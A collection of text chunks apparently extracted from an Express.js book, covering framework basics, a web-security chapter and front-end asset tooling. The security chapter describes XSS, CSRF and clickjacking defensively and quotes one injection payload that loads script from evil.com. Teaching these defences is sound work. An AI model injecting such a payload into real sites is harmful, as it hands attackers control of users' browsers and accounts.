{"express-1.1.1.txt__1": "when you're creating a web application (or to be more precise, a web server) in node.js, you write a single javascript function for your entire application. this function listens to a web browser's requests, or the requests from a mobile application consuming your api, or any other client talking to your server. when a request comes in, this function will look at the request and determine how to respond. for example, if you visit the homepage in a web browser, this function could determine that you want the homepage and it will send back some html. if you send a message to an api endpoint, this function could determine what you want and respond with json (for example).", "express-1.1.1.txt__2": "imagine we're writing a web application that tells users the time and time zone on the server. it will work like this:  \u00b7   if the client requests the homepage, our application will return an html page showing the time.  \u00b7   if the client requests anything else, our application will return an http 404 \u201cnot found\u201d error and some accompanying text.  if you were building your application on top of node.js without express, a client hitting your server might look like figure 1.1.  figure 1.1 the flow of a request through a node.js web application. circles are written by you as the developer; squares are out of your domain.", "express-1.1.1.txt__3": "in code, it's a function that takes two arguments: an object that represents the request and an object that represents the response. in our time/timezone application, the request handler function might check for the url that the client is requesting. if they're requesting the homepage, the request handler function should respond with the current time in an html page. otherwise, it should respond with a 404. every node.js application is just like this: it's a single request handler function responding to requests. conceptually, it's pretty simple!", "express-1.1.1.txt__4": "the problem is that the node apis can get complex. want to send a single jpeg file? that'll be 45 lines of code. want to create reusable html templates? figure out how to do it yourself. node.js's http server is powerful, but it's missing a lot of features that you might want if you were building a real application.", "express-1.1.2.txt__1": "in broad strokes, express adds two big features to the node.js http server.  1. express adds a number of helpful conveniences to node.js's http server, abstracting away a lot of its complexity. for example, where sending a single jpeg file is 45 lines of code in raw node.js, express reduces it to just one line.  2. express lets you refactor one monolithic request handler function into many smaller request handlers that only handle specific bits and pieces. this is more maintainable and more modular.  in contrast to figure 1.1, figure 1.2 shows how a request would flow through an express application.  figure 1.2 the flow of a request through an express. once again, circles are code you write and squares are out of your domain.  this figure might look a little more complicated, but it's much simpler for you as the developer. there are essentially two things going on here:", "express-1.1.2.txt__2": "2. request handler functions take two arguments: one is the request and the other is the response. node's http server provides you with some functionality; for example, node's http server lets you extract the browser's user-agent in one of its variables. express augments this by adding extra features like easy access to the incoming request's ip address and improved parsing of urls. the response object also gets beefed up; express adds things like the sendfile method, a one-line command that translates to about 45 lines of complicated file code. this makes it easier to write these request handler functions.", "express-1.2.txt__1": "express is a framework, which means you'll have to build your app \"the express way\". but \"the express way\" isn't too opinionated; it doesn't give you a very rigid structure. that means you can build many different kinds of applications, from video chat applications to blogs to apis.", "express-1.2.txt__2": "but this minimalism is a double-edged sword. on one hand, it's flexible and your apps are free of unused cruft. on the other hand, it does very little for you in comparison to other frameworks. this means that you make mistakes, you have to make far more decisions about your application's architecture, and you have to spend more time hunting for the right third-party modules. you get less out of the box.", "express-1.2.txt__3": "while some might like a flexible framework, others might want more rigidity. for example, paypal likes express, but built a framework on top of it that more strictly enforces conventions for their many developers. express doesn't care how you structure your apps, so two developers might make completely different decisions.", "express-1.2.txt__4": "because you're given the reins to steer your app in any direction, you might make an unwise decision that'll bite you later down the line. sometimes, i look back on my still-learning-express applications and thought, \"why did i do things this way?\"", "express-1.3.1.txt__1": "as we saw above, raw node.js gives us one request handler function to work with. the request comes into our function and the response goes out of our function.", "express-1.3.1.txt__2": "middleware can handle a variety of tasks, from logging requests to sending static files to setting http headers. for example, the first middleware function we might use in an application is a logger\u2014log every request that comes into our server. when the logger is all done logging, it will continue onto the next middleware in the chain. this next middleware function might authenticate users. if they're visiting a forbidden url, respond with a \u201cnot authorized\u201d page. if they're allowed to visit it, continue to the next function in the chain. the next function might send the homepage and be done. an illustration of two possible options is shown in figure 1.3.", "express-1.3.1.txt__3": "figure 1.3 two requests flowing through middleware functions. see that middleware sometimes continues on, but sometimes responds to requests.", "express-1.3.1.txt__4": "one of the biggest features of middleware is that it's relatively standardized, which means that lots of people have developed middleware for express (including folks on the express team). that means that if you can dream up the middleware, someone has probably made it. there's middleware to compile static assets like less and scss; there's middleware for security and user authentication; there's middleware to parse cookies and sessions.", "express-1.3.2.txt__1": "routing is better named than middleware. like middleware, it breaks the one monolithic request handler function into smaller pieces. unlike middleware, however, these request handlers are executed conditionally, depending on what url and http method a client sends.", "express-1.3.3.txt__1": "express applications can often be pretty small, even fitting in just one file. as your applications get larger, though, you'll start to want to break things up into multiple folders and files. express is unopinionated about how you scale your app, but it provides one important feature that's super helpful: sub-applications. in express lingo, these mini-applications are called routers.", "express-1.3.3.txt__2": "express allows you to define routers that can be used in larger applications. writing these sub-applications is almost exactly like writing \u201cnormal-sized\u201d ones, but it allows you to further compartmentalize your app into smaller pieces. for example, you might have an administration panel in your app, and that can function pretty differently from the rest of your app. you could put the admin panel code side-by-side with the rest of your middleware and routes, but you can also create a sub-application for your admin panel. figure 1.4 shows how an express application might be broken up with routers.", "express-1.3.4.txt__1": "express applications are made up of middleware and routes. both of them have you writing request handler functions, so you'll be doing that a lot!", "express-1.4.1.txt__1": "express is hardly the first web application framework, nor will it be the last.", "express-1.4.1.txt__2": "there are larger frameworks in the node.js world as well, perhaps the most popular of which is the full-stack meteor. while express is unopinionated about how you build your applications, meteor has a strict structure. while express only deals with the http server layer, meteor is full-stack, running code on both client and server. this are simply design choices\u2014one is not inherently better than the other.", "express-1.4.1.txt__3": "like express piles features atop node.js, some folks have decided to pile features atop express. some folks at paypal created kraken; while kraken is technically just express middleware, it sets up a lot of your application, from security defaults to bundled middleware. sails.js is another up-and-coming framework built atop express that adds databases, websocket integration, api generators, an asset pipeline, and more. both of these frameworks are more opinionated than express by design.", "express-1.4.1.txt__4": "express has several features, just one of which is middleware. connect is a web application framework for node.js that's just the middleware layer. connect doesn't have routing or conveniences; it's just middleware. express used to use connect for its middleware layer, and while it now does middleware without connect, express middleware is completely compatible with connect middleware. that means that any middleware that works in connect also works in express, which adds a huge number of helpful third-party modules to your arsenal.", "express-1.4.1.txt__5": "this is javascript, so there are countless other node.js web application frameworks out there, and i'm sure i've offended someone by not mentioning theirs.  outside of the node.js world, there are comparable frameworks.", "express-1.4.1.txt__6": "express isn't as much like python's django or ruby on rails or asp.net or java's play; those are larger, more opinionated frameworks with lots of features. express is also unlike php; while it is code running on the server, it's not as tightly coupled with html as \u201cvanilla\u201d php is.", "express-1.4.2.txt__1": "in theory, express could be used to build any web application. it can process incoming requests and respond to them, so it can do things that you can do in most of the other frameworks mentioned above. why would you choose express over something else?", "express-1.4.2.txt__2": "express helps you do this, and people have come up with a fancy name for an all-javascript stack: the mean stack. like the \"lamp\" stack stands for linux, apache, mysql, and php, \"mean\" stands for mongodb (a javascript-friendly database), express, angular (a frontend javascript framework), and node.js. people like the mean stack because it's full-stack javascript and you get all of the aforementioned benefits.", "express-1.4.2.txt__3": "express is often used to power single-page applications, or spas. spas are very javascript-heavy on the frontend, and they usually require a server component. the server is usually required to simply serve the html, css, and javascript, but there's often a rest api, too. express can do both of these things quite well; it's great at serving html and other files, and it's great at building apis. because the learning curve is relatively low for frontend developers, they can whip up a simple spa server without too much new learning.", "express-1.4.2.txt__4": "when you write applications with express, you can't get away from using node.js, so you're going to have the e and the n parts of the stack, but the other two are up to you because express is unopinionated. want to replace angular with backbone.js on the frontend? now it's the mebn stack. want to use sql instead of mongodb? now it's the sean stack. while mean is a common bit of lingo thrown around and a popular configuration, you can choose whichever you want. in this book, we'll cover the mongodb database, so we'll get the \"men\" stack.", "express-1.4.2.txt__5": "express also fits in side-by-side with a lot of real-time features. while other programming environments can support real-time features like websockets and webrtc, node.js seems to get more of that than other languages and frameworks. that means that you can  because node gets it, express gets it too.", "express-1.4.3.txt__1": "the first few chapters of this book talk about \u201ccore\u201d express\u2014that is, things that are baked into the framework. in very broad strokes, this is routes and middleware. but more than half of the book covers how to integrate express with third-party modules.  there are loads of third-party modules for express. some are made specifically for express and are compatible with its routing and middleware features. others aren't made for express specifically and work well in node.js, so they also work well with express.  in this book, we'll pick a number of third-party integrations and show some examples. but because express is unopinonated, none of the contents of this book are the only options. if i cover third-party tool x in this book, but you prefer alternative third-party tool y, you can swap them out.", "express-1.4.3.txt__2": "express doesn't have any notion of a database. you can persist your application's data however you choose; in files, in a relational sql database, or in another kind of data storage mechanism. in this book, we'll cover the popular mongodb database for data storage. as we talked about above, you should never feel \u201cboxed in\u201d with express\u2014if you want to use another data store, express will let you.", "express-1.4.3.txt__3": "users often want their applications to be secure. there are a number of helpful libraries and modules (some for \u201craw\u201d node and some for express) that can tighten the belt of your express applications. we'll explore all of this in the chapter about security (which is one of my favorite chapters, personally). we'll also talk about testing our express code to make sure that the code powering our apps is robust.", "express-1.4.3.txt__4": "an important thing to note: there's no such thing as an \u201cexpress module\u201d\u2014only a node module. a node module can be compatible with express and work well with its api, but they're all just javascript served from the npm registry and you install them in just the same way.  getting help when you need it  getting help when you need it  i really hope this book is helpful and chock-full of knowledge, but there's only so much wisdom one author can jam into a book. at some point, you're going to need to spread your wings and find answers. let me do my best to guide you:", "express-1.4.3.txt__5": "for node modules, you'll be using node's built-in npm tool and installing things from the registry at https://www.npmjs.org/ . if you need help finding good modules, i'd give substack's \"finding modules\" a read at http://substack.net/finding_modules. it's a great summary of how to find quality node packages.", "express-1.4.txt__1": "express, like any tool, doesn't exist in a vacuum.", "express-1.txt__1": "in short, express.js is a light layer on top of the node.js web server, making it more pleasant to develop node.js web applications.", "express-1.txt__2": "express is exactly the same. people want to make web applications with node.js, but the \u201cvanilla\u201d node.js apis can be verbose, confusing, and limited in features. developers often have to write a lot of boilerplate code. express exists to cut down on this boilerplate code by simplifying the apis of node.js and adding helpful new features. that's basically it!", "express-1.txt__3": "like jquery, express aims to be extensible. it's hands-off about most parts of your applications' decisions and is easily extended with third-party libraries. throughout this book and your express career, you'll have to make decisions about your applications' architectures and you'll extend express with a bevy of powerful third-party modules.", "express-10.1.txt__1": "famous security technologist bruce schneier describes something that he calls the \u201csecurity mindset\u201d:", "express-10.1.txt__2": "i replied: \"what's really interesting is that these people will send a tube of live ants to anyone you tell them to.\"", "express-10.1.txt__3": "\u2014 \u201cthe security mindset\u201d by bruce schneier, at https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html", "express-10.1.txt__4": "this chapter can't possibly cover every security vulnerability out there. between the time i write this and the time you read this, there will likely be a new attack vector that could affect your express applications. thinking like an attacker will help you defend your applications against the endless onslaught of possible security flaws.", "express-10.2.1.txt__1": "at some point in your javascript life, you've probably heard of javascript: the good parts. if you haven't, it's a famous book by douglas crockford, the inventor of json (or the \"discoverer\", as he calls it). it carves out a subset of the language that's deemed \"good\", and the rest is discouraged.", "express-10.2.3.txt__1": "it's very common for websites to have query strings. for example, almost every search engine you've ever used features a query string of some sort. a search for \"crockford backflip video\" might look something like this:  in express, you can grab the query by using req.query, like so:  listing 10.2  grabbing req.query (note: contains bugs!)  #a this variable will now contain the string \"crockford backflip video\".  this is all well and good, unless the input isn't exactly as you expect. for example, if a user visits the /search route with no query named q, then we'll be calling .replace on an undefined variable! this can crash our server.  you'll always want to make sure that your users are giving you the data you expect, and if they aren't, you'll need to do something about it. one simple option is to just provide a default case, so if they don't give anything, assume the query is empty. for example:  listing 10.3  don't assume your queries exist (note: still contains bugs!)  #a now, if req.query.q is undefined, we'll fall back to non-errant behavior. alternatively, you could redirect if nothing has been typed, or give some other behavior.  this fixes one important bug: if we're expecting a query string isn't there, we don't have undefined variables.  but there's another important gotcha with express's parsing of query strings. in addition to the variables potentially being undefined, variables can also be of the wrong type (but still be defined)!  if a user visits /search?q=abc, then req.query.q will be a string. it'll still be a string if they visit /search?q=abc&name=douglas. but if they specify the q variable twice, like this:  \u2026then req.query.q will be the array [\"abc\", \"xyz\"]. now, if you try to call .replace on it, it'll fail again because that method isn't defined on arrays. oh no!  personally, i think that this is a design flaw of express. this behavior should be allowed, but i don't think that it should be enabled by default. until they change it (and i'm not sure they have plans to), you'll need to assume that your queries could be arrays.", "express-10.2.txt__1": "at this point in your programming career, you've likely realized that most bugs are bad and that you should take measures to prevent them. it should come as no surprise that many bugs can cause security vulnerabilities. for example, if a certain kind of user input can crash your application, a hacker could simply flood your servers with those requests and bring the service down for everyone. we don't want that!", "express-10.3.1.txt__1": "in short, you want to use https instead of http. it helps protect your users against all kinds of attacks. appendix b talks about https and its motivations in greater detail. trust me\u2014you want it!  there are two pieces of express middleware that you'll want to use with https. one will force your users to use https and the other will keep them there.  force users to https  the first middleware we'll look at is express-enforces-ssl. as the name suggests, it enforces ssl (https).  here's a snippet of its source code.  listing 10.5  a snippet from express-enforces-ssl's source code  that's most of this module's code. basically, if the request is secure, it continues on. if not, it redirects to the secure version (that redirection logic isn't shown above).  to use this module, you'll need to do two things.", "express-10.3.2.txt__1": "i probably shouldn't say this, but there are a lot of ways you could steal my money. you could beat me up and rob me, you could threaten me, or you could pickpocket me. if you were a hacker, you could also hack into my bank and wire a bunch of my money to you (and of all the options we listed, this is the one i most prefer).", "express-10.3.2.txt__2": "if you could get control of my browser, even if you didn't know my password, you could still get my money.  you could wait for me to log in, and then take control of my browser.  you'd tell my browser to go to the \"wire money\" page on my bank and take a large sum of money. if you were clever, you could hide it so that i'd never even know it happened (until, of course, all of my money was gone).", "express-10.3.2.txt__3": "but how would you get control of my browser? perhaps the most popular way would be through use of a cross-site scripting attack, also known as an xss attack.  imagine that, on my bank's homepage, i can see a list of my contacts and their names.  figure 10.2  a fictional list of my bank contacts.  users have control over their names. bruce lee can go into his settings and change his name to \"bruce springsteen\" if he wants to. but what if he changed his name to this:", "express-10.3.2.txt__4": "there's one big way to prevent xss: never blindly trust user input.  escaping user input", "express-10.3.2.txt__5": "depending on where you're putting the user input, you'll sanitize things differently. as a general principle, you'll want to sanitize things as much as you can, and always keep the context in mind.  for example, if you're putting some user content inside of html tags, you'll want to make sure that it can't define any html tags. you'll want this kind of string:  to become something like this:  by doing that, the script tags will be rendered useless.", "express-10.3.2.txt__6": "if you know that the user should be entering a url, you'll want to do more than just escaping; you'll want to do your best to validate that something is a url. you'll also want to call the built-in encodeuri function on a url to make sure it's safe.", "express-10.3.2.txt__7": "you can also escape the input before you ever put it into your database. in the examples above, we're showing how to sanitize things whenever we're displaying them. but if you know that your users should enter homepages on their user profiles, it's also useful to sanitize that before you ever store it in the database. if i enter \"hello, world\" as my homepage, the server should give an error. if i enter http://evanhahn.com as my homepage, that should be allowed, and put into the database. this can have security benefits and user interface benefits.", "express-10.3.2.txt__8": "mitigating xss with http headers  there's one other way to help mitigate xss, but it's quite small, and that's through the use of http headers. once again, we'll break out helmet.", "express-10.3.2.txt__9": "now imagine you're searching \"<script src=\"http://evil.com/hack.js\"></script>\". the url might look something like this:  now, if this search engine puts that query into the html of the page, you've injected a script into the page! if i send this url to you and you click the link, i can take control and do malicious things.  the first step against this attack is to sanitize the user's input. after that, you can set a the x-xss-protection header to keep some browsers from running that script should you make a mistake. in helmet, it's just one line:  listing 10.9  using helmet to set the x-xss-protection header", "express-10.3.3.txt__1": "imagine that i'm logged into my bank. you want me to transfer a million dollars into your account, but you aren't logged in as me. (another challenge: i don't have a million dollars.) how can you get me to send you the money?  the attack  on the bank site, there's a \"transfer money\" form. on this form, one types the amount of money and the recipient of the money, and then they hit \"send\". behind the scenes, a post request is being made to a url. the bank will make sure my cookies are correct, and if they are, it'll wire the money.  you can make the post request with the amount and the recipient, but you don't know my cookie and you can't guess it; it's a long string of characters. so what if you could make me do the post request? you'll do this with cross-site request forgery (shortened to csrf, and sometimes xsrf).  to pull off this csrf attack, you'll basically have me submit a form without knowing it. imagine that you've made a form like this:  listing 10.10  a first draft of a hacker form  let's say that you put this in an html file on a page you controlled; maybe it's hacker.com/stealmoney.html. you could email me and say, \"click here to see some photos of my cat!\" if i clicked on it, i would see something like this:  and if i see that, i'll get suspicious. i won't click \"submit\" and i'll close the window. but we can use javascript to automatically submit the form.  listing 10.11  automatically submitting the form  if i get sent to this page, the form will immediately submit and i'll be sent to my bank, to a page that says \"congratulations, you've just transferred a million dollars.\" i'll probably panic and call my bank, and the authorities can likely sort something out.", "express-10.3.3.txt__2": "my bank needs to protect against this. but how?  overview of protecting against csrf  my bank already checks cookies, to make sure that it's me. you can't perform csrf attacks without getting me to do something. but once the bank knows it's me, how does it know that i meant to do something and wasn't being tricked into doing something?  my bank decides this: if you're submitting a post request to mybank.biz/transfermoney, you're not just doing that out of the blue. before doing that post, you'll be on a page that's asking you where you want to transfer your money--perhaps the url is mybank.biz/transfermoney_form.  so when the bank sends you the html for mybank.biz/transfermoney_form, it's going to add a hidden element to the form: a completely random, unguessable string called a token. the form might now look like this:  listing 10.12  adding csrf protections  #a the value of the csrf token will be different for every user, often every time. the above is just an example.  you've probably used thousands of csrf tokens while browsing the web, but you haven't seen it because it's hidden from you. if you're like me and you enjoy viewing the html source of pages, you'll see csrf tokens!", "express-10.3.3.txt__3": "in short, we need to do two things:  1. create a random csrf token every time we're asking users for data  2. validate that random token every time we deal with that data  protecting against csrf in express  the express team has a simple middleware that does those two tasks: csurf (at https://github.com/expressjs/csurf ). the csurf middleware does two things:  1. adds a method to the request object called req.csrftoken. you'll send this token whenever you send a form, for example.", "express-10.3.3.txt__4": "to install this middleware, just run npm install csurf --save.", "express-10.3.txt__1": "governments have had their sites defaced; twitter had a kind of \"tweet virus\"; bank account information has been stolen. even products who aren't dealing with particularly sensitive data can still have passwords leaked\u2014sony and adobe have been caught up in such scandals. if you site has users, you'll want to be responsible and protect them.", "express-10.4.1.txt__1": "it might sound a bit crazy, but you can often easily audit the code of your dependencies. while some modules like express have a relatively large surface area, many of the modules you'll install are only a small number of lines, and you can understand them quickly. it's a fantastic way to learn, too!", "express-10.4.2.txt__1": "it's (almost) always a good idea to have the latest versions of things. people tune performance, fix bugs, and improve apis. you could manually go through each of your dependencies to find out which versions were out of date, or you could use a tool built into npm: npm outdated.  let's say that your project has express 4.2.0 installed, but the latest version is 4.11.1 (which i'm sure will be out of date by the time you read this). in your project directory, run npm outdated --depth 0 and you'll see an output something like this:  if you have other outdated packages, this command will report those too. go into your package.json, update the versions, and run npm install to get the latest versions!  it's a good idea to check for outdated packages frequently.  what's that depth thing?  what's that depth thing?", "express-10.4.2.txt__2": "there's not much i can do if express doesn't update to the latest version (that's largely out of my control), other than update to the latest version of express (which is in my control). the --depth flag only shows actionable information, where leaving it out gives you a bunch of information you can't really use.", "express-10.4.3.txt__1": "sometimes, modules have security issues. some nice folks set up the node security project, an ambitious undertaking to audit every module in the npm registry. if they find an insecure module, they post an advisory at http://nodesecurity.io/advisories.  the node security project also comes with a command-line tool, called nsp. it's a simple but powerful tool that scans your package.json for insecure dependencies (by comparing them against their database).  to install it, run npm install \u2013g nsp to install the module globally. now, in the same directory as your package.json, type:  most of the time, you'll get a nice message that tells you that your packages are known to be secure. but sometimes, one of your dependencies (or, more often, one of your dependencies' dependencies) has a security hole.  for example, express depends on a module called serve-static; this is express.static, the static file middleware. in early 2015, a vulnerability was found in serve-static.  if you're using a version of express that depended on serve-static, run nsp audit-package and you'll see something like this:", "express-10.4.txt__1": "any express application will depend on at least one third-party module: express. if the rest of this book has shown you anything, it's that you'll be depending on lots of third-party modules. this has the huge advantage that you don't have to write a lot of boilerplate code, but it does come with one cost: you're putting your trust in these modules. what if the module creates a security problem?", "express-10.5.txt__1": "i've got some bad news: your server is might crash at some point.", "express-10.6.2.txt__1": "i think clickjacking is quite clever. it's relatively easy to prevent, but i almost feel guilty for doing so\u2014it's such a clever trick.  imagine i'm a hacker, and i want to find out information from your private social networking profile. i'd love it if you would just make your profile public. it'd be so easy, if i could just get you to click the big button:  figure 10.3 an example page for a social network.  clickjacking takes advantage of browser frames\u2014the ability to embed one page in another\u2014to make this happen. i could send you a link to an innocent-looking page, which might look something like this:  figure 10.4  an innocent-looking page that's concealing a clickjacking attack.  but in reality, this innocent-looking page is concealing the social network page! there's an <iframe> of the social network site, and it's invisible. it's positioned just right, so that when you click \"click here to enter my page\", you're actually clicking \"click to make profile public\".  figure 10.5  not so innocent now, is it!?  i don't know about you, but i think that's quite clever. unfortunately for hackers, it's quite easily prevented.  most browsers (and all modern ones) listen for a header called x-frame-options. if it's loading a frame or iframe and that page sends a restrictive x-frame-options, the browser won't load the frame any longer.", "express-10.6.3.txt__1": "adobe products like flash player and reader can make cross-origin web requests. as a result, a flash file could make requests to your server. if another website serves a malicious flash file, users of that site could make arbitrary requests to your express application (likely unknowingly). this could cause them to hammer your server with requests or to load resources you don't intend them to.", "express-10.6.3.txt__2": "this is easily prevented by adding a file at the root of your site called crossdomain.xml.  when an adobe product is going to load a file off of your domain, it will first check the crossdomain.xml file to make sure your domain allows it. as the administrator, you can define this xml file to keep certain flash users in or out of your site. it's likely, however, that you don't want any flash users on your page. in that case, make sure you're serving this xml content at the root of your site (at /crossdomain.xml):", "express-10.6.4.txt__1": "imagine a user has uploaded a plain text file to my server called file.txt. my server serves this with a text/plain content-type, because it's plain text. so far, this is simple. but what if file.txt contains something like this:  listing 10.24  a malicious script that could be stored as plain text", "express-10.6.txt__1": "we've already covered most of the big topics like cross-site scripting and https. there are a few other tricks that you can employ to make your express applications even more secure. the topics in this section are hardly as essential in the ones above, but they're quick and easy and can lower the amount of places that you can be attacked.", "express-10.txt__1": "in chapter 8, i told you that i had three favorite chapters.  the first was chapter 3, where i discussed the foundations of express in an attempt to give you a solid understanding of the framework. the second favorite was chapter 8, where your applications used databases to become \u201cmore real\u201d. welcome to my final favorite: the chapter about security.", "express-10.txt__2": "i probably don't have to tell you that computer security is important, and becoming more so by the day. you've surely seen news headlines about data breaches, cyber-warfare, and \u201chacktivism\u201d. as our world moves more and more into the digital sphere, our digital security becomes more and more important.", "express-11.1.1.txt__1": "css doesn't have variables. if your website's link color is #29a1a4, for example, and you decide you want to change it to #454545, you'd have to search for it everywhere in your css file and change it. if you want to experiment with a color that's used in many different places, you'll be doing find-replace, which can lead to various reliability issues. it's also unclear to other developers which color is which; where is that color used in various places?", "express-11.1.1.txt__2": "less added variables to css, allowing you to solve this kind of problem.  for example, let's say you want to define your site's primary color as #ff9900. in less, you might do something like this:  listing 11.1 variables in less  #a define the variable primary-color.  #b use that variable in several places.  if you run the less code in listing 11.1 through a less compiler (like the one at http://less2css.org/), the following css will be produced:  listing 11.2 the compiled css from listing 11.1  #a notice that the variable is being inserted here.  as you can see, the variable is being inserted into the resulting css. now, if we want to change the primary color of our site, we only have to do it in one place: the variable at the top.", "express-11.1.2.txt__1": "less also has functions, which allow you to manipulate variables and values just like you could in a programming language like javascript. like a typical programming language, there are a number of built-in functions that can help you out. unlike a typical programming language, however, these functions are all built into the language; you can't define your own; you'll have to use another feature called \u201cmixins\u201d, which we'll talk about in the next section.", "express-11.1.4.txt__1": "in html, your elements are nested. everything goes inside the <html> tag, and then your content will go into the <body> tag. inside the body, you might have a <header> with a <nav> for navigation. your css doesn't exactly mirror this; if you wanted to style your header and the navigation inside of your header, you might write some css like this:", "express-11.1.4.txt__2": "listing 11.7 css example with no nesting  in less, listing 11.7 would be improved to this:  listing 11.8 a simple less nesting example  #a notice how the styling for the nav is inside of another selector.  less improves css to allow for nested rulesets. this means that your code will be shorter, more readable, and a better mirror of your html.  nesting the parent selectors", "express-11.1.5.txt__1": "as your site gets bigger and bigger, you'll start to have more and more styles. in css, you can break your code up into multiple files, but this incurs the performance penalty of multiple http requests.", "express-11.1.6.txt__1": "at this point in the book, it should come as no surprise: there's more than one way to do css preprocessing. the elephant in the room is less's biggest \u201crival\u201d, sass. sass is very similar to less; both have variables, mixins, nested selectors, includes, and integration with express. as far as the languages go, they're pretty similar. sass isn't originally a node project, but it is very popular and has done a solid job integrating itself into the node world. you can check it out at http://sass-lang.com/.", "express-11.1.6.txt__2": "most people reading this book will either want to use less or sass. while we'll use less in this book, you can usually substitute the word \u201cless\u201d for the word \u201csass\u201d and it will be the same. less and sass vary slightly in syntax, but they're largely the same conceptually and in how you integrate them with express.", "express-11.1.6.txt__3": "there are smaller-time css preprocessors that aim to fundamentally change css in one way or another. stylus makes css's syntax a lot nicer and roole adds a number of powerful features, and while they are both great, they aren't as popular as less or sass.", "express-11.1.txt__1": "harken back to chapter 1, where we talked about the motivations for express. in short, we said that node.js is powerful but its syntax can be a little cumbersome and it can be a little limited. that's why express was made\u2014it doesn't fundamentally change node; it just smooths it out a bit.  in that way, less and css are a lot like express and node. in short, css is a powerful layout tool but its syntax can be cumbersome and limited. that's why less was made\u2014it doesn't fundamentally change css; it just smooths it out a bit.", "express-11.2.1.txt__1": "let's say you want to write a webpage that generates a random color and sets the background to that color. maybe you want to be inspired for the next great color scheme.", "express-11.2.1.txt__2": "make a new folder to build this. we'll make a package.json that looks something like this (your package versions may vary):  listing 11.11 package.json for our simple browserify example  run npm install and then create a file called main.js. put this inside:  listing 11.12 main.js for our simple browserify example  note that this file uses the require statement, but it's made for the browser, which doesn't have that natively. get ready for your little mind to be blown!!  finally, define a simple html file with the following contents:  listing 11.13 html file for our simple browserify example  now, if you save all that and run npm run build-my-js, browserify will compile main.js into a new file, compiled.js. open the html file you saved to see a webpage that generates random colors every time you refresh!  you can open compiled.js to see that your code is there, as is the random-color module. the code will be ugly, but here's what it looks like:  they're both wrapped in a bit of browserify stuff to fake node's module system, but they're there...and most importantly, they work! you can now require node modules in the browser.  browserify is so great. love it.", "express-11.2.txt__1": "in short, browserify is a tool for packaging javascript that allows you to use the require  function just like you do in node. and i love browserify. i just want to get that out of the way. freakin' love this thing.", "express-11.2.txt__2": "first, this lets you easily define modules. if browserify sees that evan.js requires cake.js and burrito.js, it'll package up cake.js and burrito.js and concatenate them into the compiled output file.", "express-11.3.1.txt__1": "these instructions will deviate from the official grunt instructions a bit. the documentation will tell you to install grunt globally, but i believe that you should install everything locally if you can. this allows you to install multiple versions of grunt on your system and doesn't pollute your \"global\" registry.", "express-11.3.2.txt__1": "when we learned about less above, i recommended a website that compiled your code live, in front of you. that's great for learning and it's useful to make sure your code is being compiled correctly, but it's hardly an automated solution. you don't want to have to put all of your code into a website, copy-paste the resulting css, and copy it into a css file! let's make grunt do it. (if you're not using less, there are other grunt tasks for your favorite preprocessor. just search the grunt plugins page at http://gruntjs.com/plugins.)", "express-11.3.2.txt__2": "let's start by writing a very simple less file, which we'll compile to css with grunt.  listing 11.17 a simple less file  that should translate to the following css:  listing 11.18 listing 11.17 compiled to css  and if we minify that css, it should look like this:  listing 11.19 listing 11.18, minified  we can use a third-party less task for grunt to get us there! start by installing this grunt less task with npm install grunt-contrib-less --save-dev. next, add the following to your gruntfile:  listing 11.20 a gruntfile with less  #z grunt.initconfig is called at the top of every gruntfile to configure settings for each of your tasks. in this case, we're only configuring less right now.  #a we define the configuration for our less tasks. this is what the grunt less task will look at.  #b define the development configuration. this configuration tells the grunt less plugin to compile my_css/the.less into tmp/serve/the.css.  #c like our development configuration, we define the production configuration, but we also use cleancss to minify the output.  #d this loads the grunt less plugin. without this, we won't be able to compile anything!  #e this tells grunt to run the less compilation task when we run \u201cgrunt\u201d at the command line.  now, when you run grunt npm run grunt, your less will be compiled into tmp/serve/the.css. after doing that, you'll need to make sure to serve that file.  serving these compiled assets  now that we've compiled something, we actually need to serve it to our visitors! we'll use express's static middleware to do that. we'll just add tmp/serve as part of our middleware stack. for example:  listing 11.21 static middleware with compiled files  now, you can serve files from public and compiled files from tmp/serve!", "express-11.3.5.txt__1": "while you're developing, you don't want to have to run npm run grunt every time you edit a file. there's a grunt task that watches your files and re-runs any grunt tasks when a change occurs. enter grunt-contrib-watch. let's use it to auto-compile any css and javascript whenever they change.  start by installing the task with npm install grunt-contrib-watch --save-dev, then add some stuff to your gruntfile like so:  listing 11.24 a gruntfile with watching added  #a tell the grunt watch task to run the browserify task any time a .js file changes.  #b tell the grunt watch task to run the less task any time a .less file changes.  #c register the new watch task to execute when you run \u201cgrunt watch\u201d.", "express-11.3.txt__1": "we've taken a look at less and browserify, but we haven't found an elegant way to wire them into our express apps yet.  we'll look at two ways to handle this, the first of which is with the use of a tool called grunt. grunt (at http://gruntjs.com/) calls itself \"the javascript task runner\", which is exactly what it sounds like: it runs tasks. if you've ever used make or rake, grunt will seem familiar.", "express-11.4.1.txt__1": "you'll need to npm install connect-assets --save and any other compilers you'll need:  \u00b7   coffee-script for coffeescript support  \u00b7   stylus for stylus support  \u00b7   less for less support  \u00b7   node-sass for sass support  \u00b7   ejs for some ejs support  \u00b7   uglify-js for javascript minification  \u00b7   csso for css minification  the last two won't be used by default in development mode, but will be in production. if you don't change the default options and forget to install those, your app will fail in production. make sure to get those installed!", "express-11.4.2.txt__1": "the middleware has some quick-start options which make it easy to get started, but i strongly recommend configuring things. for example, one of the configuration options can keep connect-assets from muddying the global namespace, which it does by default. here's what a simple application setup might look like:", "express-11.4.2.txt__2": "listing 11.25 setting up the connect-assets middleware  #a this attaches connect-assets's view helpers to app.locals, rather than making them global variables.  #b specify any asset paths you're using. order matters here\u2014if the.js exists in multiple directories, for example, it'll only compile the one listed first.", "express-11.4.3.txt__1": "connect-assets provides two major helper functions to your views: js and css. js(\"myfile\") will generate a <script> tag that corresponds to myfile. the css helper will do the same but for css, with a <link> tag. they return the html to include the most recent version of your assets, which means that they'll append a long hash to the name to make sure your browser doesn't use old cached assets.", "express-11.4.txt__1": "i don't love grunt, to be quite honest. i include it in the book because it's incredibly popular and powerful, but i find the code verbose and a little confusing. there's another solution for express users: a piece of middleware called connect-assets (at https://github.com/adunkman/connect-assets).", "express-11.4.txt__2": "connect-assets can concatenate, compile to, and minify javascript and css. it supports coffeescript, stylus, less, sass, and even some ejs. it doesn't support browserify and isn't as configurable as build tools like grunt or gulp, but it's very easy to use.  connect-assets is heavily inspired by the sprockets asset pipeline from the ruby on rails world. if you've used that, this will be quite familiar, but if you haven't, don't worry!", "express-11.5.2.txt__1": "let's make a simple hello world application and deploy it to heroku, shall we?  to set your app up for heroku, you don't have to do too much different from what you normally would. while there are a few commands you'll need to run in order to deploy, the only changes you'll need to make are as follows:  1. make sure to start the app on process.env.port.  